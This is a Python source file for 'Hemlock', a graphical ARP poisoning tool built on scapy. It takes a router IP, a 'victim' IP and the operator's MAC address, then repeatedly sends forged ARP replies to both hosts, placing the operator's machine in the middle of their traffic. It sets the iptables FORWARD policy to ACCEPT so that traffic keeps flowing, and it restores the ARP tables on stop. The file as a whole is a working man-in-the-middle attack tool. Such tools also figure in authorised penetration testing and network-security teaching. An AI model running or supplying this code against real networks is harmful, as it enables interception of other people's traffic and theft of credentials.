#!/usr/bin/env python3
import customtkinter, subprocess, sys, re, time, os, threading, webbrowser
import scapy.all as scapy
from CTkMessagebox import CTkMessagebox

def restore_arp_table(router, victim):
    try:
        router_mac = scapy.getmacbyip(router)
        victim_mac = scapy.getmacbyip(victim)
        arp_packet = scapy.ARP(op=2, psrc=router, pdst=victim, hwsrc=router_mac)
        scapy.send(arp_packet, verbose=False)
        arp_packet = scapy.ARP(op=2, psrc=victim, pdst=router, hwsrc=victim_mac)
        scapy.send(arp_packet, verbose=False)
    except:
        pass

def send_poisoning(router, victim, mac):
    arp_packet = scapy.ARP(op=2, psrc=router, pdst=victim, hwsrc=mac)
    scapy.send(arp_packet, verbose=False)
    arp_packet = scapy.ARP(op=2, psrc=victim, pdst=router, hwsrc=mac)
    scapy.send(arp_packet, verbose=False)

def spoofing_switch_changed(state, routerip, victimip, timespoof, mac):
    router = routerip.get()
    victim = victimip.get()
    timespoof = int(timespoof.get())
    ip_pattern = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')

    if ip_pattern.match(router) and ip_pattern.match(victim):
        while state.get() == 1:
            try:
                state.configure(text="Spoofing ON 🟢")
                send_poisoning(router, victim, mac)
                time.sleep(timespoof)
            except:
                break
        state.configure(text="Spoofing OFF 🔴")
        restore_arp_table(router, victim)
    else:
        state.deselect()
        state.configure(text="Spoofing OFF 🔴\n INVALID IPs Values")

# Main window setup
def main():
    windows = customtkinter.CTk()
    windows.title("Hemlock ARP Spoofer")
    windows.geometry("500x500")
    windows.resizable(False, False)
    
    windows.grid_columnconfigure(0, weight=1)
    windows.grid_rowconfigure((0,1,2,3,4,5,6), weight=1)
    
    TITLE_FONT = customtkinter.CTkFont(size=24, weight="bold", family="Consolas")
    LABEL_FONT = customtkinter.CTkFont(size=14)
    ENTRY_FONT = customtkinter.CTkFont(size=12)
    BUTTON_FONT = customtkinter.CTkFont(size=12, weight="bold")

    # ===== Header Section =====
    header_frame = customtkinter.CTkFrame(windows, fg_color="transparent")
    header_frame.grid(row=0, column=0, padx=20, pady=(20,10), sticky="nsew")
    
    logo = customtkinter.CTkLabel(
        header_frame, 
        text="HEMLOCK", 
        font=TITLE_FONT,
        text_color="#2ecc71"
    )
    logo.pack(expand=True)
    
    subtitle = customtkinter.CTkLabel(
        header_frame,
        text="ARP Poisoning Tool",
        font=customtkinter.CTkFont(size=12),
        text_color="gray70"
    )
    subtitle.pack(pady=(0,10))

    # ===== Input Section =====
    input_frame = customtkinter.CTkFrame(windows)
    input_frame.grid(row=1, column=0, padx=20, pady=10, sticky="nsew")
    input_frame.grid_columnconfigure((0,1), weight=1)
    
    router_label = customtkinter.CTkLabel(
        input_frame, 
        text="Router IP:", 
        font=LABEL_FONT,
        anchor="w"
    )
    router_label.grid(row=0, column=0, padx=10, pady=(10,5), sticky="w")
    
    router_entry = customtkinter.CTkEntry(
        input_frame,
        placeholder_text="192.168.1.1",
        font=ENTRY_FONT,
        justify="center"
    )
    router_entry.grid(row=1, column=0, padx=10, pady=(0,10), sticky="ew")
    
    victim_label = customtkinter.CTkLabel(
        input_frame, 
        text="Target IP:", 
        font=LABEL_FONT,
        anchor="w"
    )
    victim_label.grid(row=0, column=1, padx=10, pady=(10,5), sticky="w")
    
    victim_entry = customtkinter.CTkEntry(
        input_frame,
        placeholder_text="192.168.1.100",
        font=ENTRY_FONT,
        justify="center"
    )
    victim_entry.grid(row=1, column=1, padx=10, pady=(0,10), sticky="ew")
    
    interval_label = customtkinter.CTkLabel(
        input_frame,
        text="Spoofing Interval (sec):",
        font=LABEL_FONT,
        anchor="w"
    )
    interval_label.grid(row=2, column=0, padx=10, pady=(10,5), sticky="w")
    
    interval_menu = customtkinter.CTkOptionMenu(
        input_frame,
        values=["1", "3", "5", "10", "20", "30"],
        font=ENTRY_FONT,
        dynamic_resizing=False,
        anchor="center"
    )
    interval_menu.grid(row=3, column=0, columnspan=2, padx=10, pady=(0,10), sticky="ew")
    interval_menu.set("5")

    # ===== Control Section =====
    control_frame = customtkinter.CTkFrame(windows, fg_color="transparent")
    control_frame.grid(row=2, column=0, padx=20, pady=10, sticky="nsew")
    
    spoof_switch = customtkinter.CTkSwitch(
        control_frame,
        text="Start ARP Spoofing",
        font=BUTTON_FONT,
        command=lambda: threading.Thread(
            target=spoofing_switch_changed,
            args=(spoof_switch, router_entry, victim_entry, interval_menu, mac),
            daemon=True
        ).start()
    )
    spoof_switch.pack(pady=20)

    # ===== Footer Section =====
    footer_frame = customtkinter.CTkFrame(windows, fg_color="transparent")
    footer_frame.grid(row=3, column=0, padx=20, pady=(10,10), sticky="nsew")
    
    version_label = customtkinter.CTkLabel(
        footer_frame,
        text="v1.2 | by SergioBrvo01",
        font=customtkinter.CTkFont(size=10),
        text_color="gray50"
    )
    version_label.pack(side="left")
    
    github_link = customtkinter.CTkLabel(
        footer_frame,
        text="GitHub",
        font=customtkinter.CTkFont(size=10, underline=True),
        text_color="#3498db",
        cursor="hand2"
    )
    github_link.pack(side="right")
    github_link.bind("<Button-1>", lambda e: webbrowser.open("https://github.com/SergioBrvo01/Hemlock"))

    # MAC address dialog (shown first)
    windows.withdraw()
    try:
        error_mac_message = ''
        while True:
            getmac = customtkinter.CTkInputDialog(
                text=f"Enter your MAC address\n(Format: FF:FF:FF:FF:FF:FF){error_mac_message}", 
                title="Hemlock - MAC Address"
            )
            mac = getmac.get_input()
            mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
            if mac_pattern.match(mac):
                break
            else:
                error_mac_message = "\n\nInvalid MAC format. Please try again."
    except:
        sys.exit(1)
    
    windows.deiconify()
    windows.mainloop()

if __name__ == "__main__":
    try:
        user = os.getuid()
        if user == 0:
            subprocess.run(["iptables", "--policy", "FORWARD", "ACCEPT"])
            main()
        else:
            error_window = customtkinter.CTk()
            CTkMessagebox(title="Invalid User", message="You must be ROOT user", icon="cancel")
            error_window.after(3000, error_window.destroy)
            error_window.withdraw()
            error_window.mainloop()
            sys.exit(1)
    finally:
        if user == 0:
            subprocess.run(["iptables", "--policy", "FORWARD", "DROP"])
